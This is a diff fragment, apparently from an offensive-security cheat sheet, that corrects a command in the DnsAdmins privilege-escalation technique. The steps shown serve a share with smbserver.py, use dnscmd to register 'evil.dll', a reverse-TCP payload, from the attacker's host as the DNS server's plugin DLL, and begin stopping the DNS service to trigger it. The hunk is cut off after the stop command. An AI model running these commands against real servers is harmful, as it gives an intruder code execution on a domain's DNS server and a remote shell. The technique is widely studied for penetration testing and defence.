@@ -20,7 +20,7 @@ Create your share
 smbserver.py sharename /path/to/smbdirectory/ -smb2support
 
 Inject your reversetcp payload on the dnsserver
-dnscmd hostname /config /serverlevelplugindll \\yourip\sharename\evil.dll
+dnscmd \\hostname /config /serverlevelplugindll \\yourip\sharename\evil.dll
 
 Restart your service to exploit
 sc.exe stop dns
